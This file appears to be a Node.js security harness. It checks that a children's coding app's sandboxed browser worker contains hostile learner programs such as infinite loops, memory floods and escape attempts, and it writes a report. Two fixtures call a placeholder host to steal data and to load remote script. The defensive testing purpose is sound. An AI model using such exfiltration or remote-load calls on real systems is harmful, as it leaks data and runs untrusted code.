#!/usr/bin/env node
/**
 * Phase 6 security gate: drive the *built* runner worker inside a real browser
 * with hostile learner code.
 *
 * The coordinator tests in packages/code-runner feed synthetic messages and so
 * cannot prove the browser transport contains anything. This harness loads the
 * production worker bundle in Chrome, posts hostile programs over the real
 * postMessage channel, and asserts that every one of them is contained: a fault
 * arrives, the command budget holds, and the worker stays answerable afterwards.
 *
 * Usage:  pnpm hostile-check            (expects apps/web/dist to be built)
 */
import { createReadStream, existsSync, readdirSync, writeFileSync } from 'node:fs';
import { createServer } from 'node:http';
import { extname, join, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';

import { launchChrome } from './launch-chrome.mjs';

const root = resolve(fileURLToPath(import.meta.url), '..', '..');
const dist = join(root, 'apps', 'web', 'dist');

const MIME = {
  '.html': 'text/html',
  '.js': 'text/javascript',
  '.mjs': 'text/javascript',
  '.css': 'text/css',
  '.wasm': 'application/wasm',
  '.json': 'application/json',
  '.woff': 'font/woff',
  '.woff2': 'font/woff2',
};

/**
 * Each fixture is learner source plus the fault codes that count as containment.
 * More than one code can be correct: a runaway loop may hit the instruction
 * budget or the wall clock first depending on how much CPU the worker gets.
 */
const FIXTURES = [
  {
    name: 'infinite loop',
    source: 'while (true) {}',
    accept: ['timeout'],
    maxCommands: 0,
  },
  {
    name: 'unbounded recursion',
    source: 'function f() { return f(); } f();',
    accept: ['memory', 'timeout'],
    maxCommands: 0,
  },
  {
    name: 'command flood',
    source: 'for (let i = 0; i < 100000; i += 1) { moveForward(); }',
    accept: ['commandLimit', 'timeout'],
    maxCommands: 6,
  },
  {
    name: 'blocked global: fetch',
    source: 'fetch("http://example.test/steal");',
    accept: ['blockedApi'],
    maxCommands: 0,
  },
  {
    name: 'blocked global: XMLHttpRequest',
    source: 'new XMLHttpRequest();',
    accept: ['blockedApi'],
    maxCommands: 0,
  },
  {
    name: 'blocked global: importScripts',
    source: 'importScripts("http://example.test/x.js");',
    accept: ['blockedApi'],
    maxCommands: 0,
  },
  {
    name: 'escape attempt: postMessage to host',
    source: 'postMessage({ type: "runFinished", runId: "forged" });',
    accept: ['blockedApi'],
    maxCommands: 0,
  },
  {
    name: 'escape attempt: reach the DOM',
    source: 'document.body.innerHTML = "x";',
    accept: ['blockedApi'],
    maxCommands: 0,
  },
  {
    name: 'escape attempt: reach storage',
    source: 'localStorage.setItem("x", "1");',
    accept: ['blockedApi'],
    maxCommands: 0,
  },
  {
    name: 'allocation growth',
    source: 'const a = []; while (true) { a.push(new Array(10000).fill(1)); }',
    accept: ['memory', 'timeout'],
    maxCommands: 0,
  },
  {
    name: 'syntax error',
    source: 'moveForward(',
    accept: ['syntax'],
    maxCommands: 0,
  },
  {
    name: 'locked command for this mission',
    source: 'interact();',
    accept: ['blockedApi'],
    maxCommands: 0,
  },
  {
    name: 'locked predicate for this mission',
    source: 'while (canMoveForward()) { moveForward(); }',
    accept: ['blockedApi'],
    maxCommands: 0,
  },
];

// A mission that unlocks movement only, matching M01.
const CAPABILITIES = {
  apiVersion: 'v1',
  allowedCommandKinds: ['moveForward'],
  allowLogs: true,
};
const BUDGETS = {
  memoryBytes: 4 * 1024 * 1024,
  maxInstructions: 4096,
  maxCommands: 6,
  deadlineMs: 12000,
};

const workerFileName = () => {
  const assets = join(dist, 'assets');
  if (!existsSync(assets)) {
    throw new Error('apps/web/dist/assets is missing. Run `pnpm build` first.');
  }
  const file = readdirSync(assets).find((name) => /^worker-.*\.js$/.test(name));
  if (!file) throw new Error('No built runner worker found in apps/web/dist/assets.');
  return file;
};

const harnessPage = (worker) => `<!doctype html>
<html><body><script type="module">
const worker = new Worker('/assets/${worker}', { type: 'module' });
window.__events = [];
window.__ready = false;
worker.addEventListener('message', (event) => {
  if (event.data && event.data.type === 'ready') { window.__ready = true; return; }
  window.__events.push(event.data);
});
worker.addEventListener('error', (event) => {
  window.__events.push({ type: 'workerError', message: event.message });
});
window.__run = (runId, source, capabilities, budgets) => {
  window.__events = [];
  worker.postMessage({ type: 'run', runId, source, capabilities, budgets });
};
</script></body></html>`;

const serveDist = (worker) =>
  new Promise((ready) => {
    const server = createServer((request, response) => {
      const url = new URL(request.url, 'http://localhost');
      if (url.pathname === '/harness.html') {
        response.writeHead(200, { 'content-type': 'text/html' });
        response.end(harnessPage(worker));
        return;
      }
      const file = join(dist, url.pathname);
      if (!file.startsWith(dist) || !existsSync(file)) {
        response.writeHead(404).end();
        return;
      }
      response.writeHead(200, {
        'content-type': MIME[extname(file)] ?? 'application/octet-stream',
      });
      createReadStream(file).pipe(response);
    });
    server.listen(0, () => ready({ server, port: server.address().port }));
  });

const main = async () => {
  const worker = workerFileName();
  const { server, port } = await serveDist(worker);
  const browser = await launchChrome();
  const page = await browser.newPage();
  const results = [];

  try {
    await page.goto(`http://localhost:${port}/harness.html`);
    await page.waitForFunction(() => window.__ready === true, null, { timeout: 60000 });

    for (const [index, fixture] of FIXTURES.entries()) {
      const runId = `hostile-${index}`;
      const started = Date.now();
      await page.evaluate(
        ([id, source, capabilities, budgets]) => window.__run(id, source, capabilities, budgets),
        [runId, fixture.source, CAPABILITIES, BUDGETS],
      );

      const settled = await page
        .waitForFunction(
          (id) =>
            window.__events.some(
              (event) =>
                (event.type === 'runFault' || event.type === 'runFinished') && event.runId === id,
            ),
          runId,
          { timeout: 45000 },
        )
        .then(() => true)
        .catch(() => false);

      const events = await page.evaluate(() => window.__events);
      const fault = events.find((event) => event.type === 'runFault');
      const commands = events.filter((event) => event.type === 'commandRequested').length;
      const contained =
        settled &&
        Boolean(fault) &&
        fixture.accept.includes(fault.code) &&
        commands <= fixture.maxCommands;

      results.push({
        name: fixture.name,
        contained,
        code: fault ? fault.code : settled ? 'no fault (run finished)' : 'NO RESPONSE',
        commands,
        seconds: ((Date.now() - started) / 1000).toFixed(1),
      });
      console.log(
        `${contained ? 'PASS' : 'FAIL'}  ${fixture.name.padEnd(34)} ` +
          `fault=${results.at(-1).code.padEnd(22)} commands=${commands} ${results.at(-1).seconds}s`,
      );
    }

    // The worker must still be usable after every hostile run: containment that
    // kills the runner would fail a child's next honest attempt.
    await page.evaluate(
      ([capabilities, budgets]) =>
        window.__run('recovery', 'moveForward();', capabilities, budgets),
      [CAPABILITIES, BUDGETS],
    );
    const recovered = await page
      .waitForFunction(
        () => window.__events.some((event) => event.type === 'runFinished'),
        null,
        { timeout: 45000 },
      )
      .then(() => true)
      .catch(() => false);
    console.log(`${recovered ? 'PASS' : 'FAIL'}  runner still answers an honest program after all fixtures`);
    results.push({
      name: 'recovery after hostile runs',
      contained: recovered,
      code: recovered ? 'runFinished' : 'NO RESPONSE',
      commands: 1,
      seconds: '-',
    });
  } finally {
    await browser.close();
    server.close();
  }

  const failed = results.filter((result) => !result.contained);
  const rows = results
    .map(
      (result) =>
        `| ${result.name} | ${result.contained ? 'contained' : '**ESCAPED**'} | \`${result.code}\` | ${result.commands} | ${result.seconds}s |`,
    )
    .join('\n');

  writeFileSync(
    join(root, 'docs', 'evidence', 'phase-6', 'E-08-browser-worker-hostile-report.md'),
    `# E-08 — Browser-worker hostile-code report

> Generated by \`pnpm hostile-check\` (scripts/hostile-code-harness.mjs).
> Runs the production worker bundle in Chrome over the real postMessage channel.

Worker bundle: \`${worker}\`
Capabilities: \`${CAPABILITIES.allowedCommandKinds.join(', ')}\`
Budgets: ${BUDGETS.maxCommands} commands, ${BUDGETS.maxInstructions} instructions, ${BUDGETS.memoryBytes / 1024 / 1024} MB, ${BUDGETS.deadlineMs} ms
Result: **${failed.length === 0 ? 'all fixtures contained' : `${failed.length} ESCAPED`}**

| Fixture | Outcome | Fault | Commands released | Time |
|---|---|---|---:|---:|
${rows}

"Commands released" counts \`commandRequested\` messages that reached the host. The
host never applies them directly: the coordinator holds them in an immutable
queue and releases one per animation boundary.
`,
    'utf8',
  );

  console.log(`\n${results.length - failed.length}/${results.length} contained`);
  if (failed.length > 0) {
    console.error('Hostile code escaped containment:', failed.map((f) => f.name).join(', '));
    process.exit(1);
  }
};

await main();
